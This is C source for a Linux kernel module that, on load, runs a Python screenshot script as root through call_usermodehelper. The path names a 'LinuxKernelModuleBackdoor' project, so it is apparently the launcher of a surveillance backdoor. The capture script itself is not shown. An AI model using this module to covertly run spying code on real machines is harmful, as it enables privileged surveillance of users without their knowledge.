#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>

static int __init execute_python_init(void)
{
    char *argv[] = { "/usr/bin/python3", "/home/guscarenci/Documents/LinuxKernelModuleBackdoor/src/screenshotUserSpace.py", NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    };
    
    printk(KERN_INFO "Executing Python script...\n");
    
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    
    printk(KERN_INFO "Python script executed.\n");
    
    return 0;
}

static void __exit execute_python_exit(void)
{
    printk(KERN_INFO "Exiting module.\n");
}

module_init(execute_python_init);
module_exit(execute_python_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Gustavo Moura");
MODULE_DESCRIPTION("Kernel module to execute a Python script");
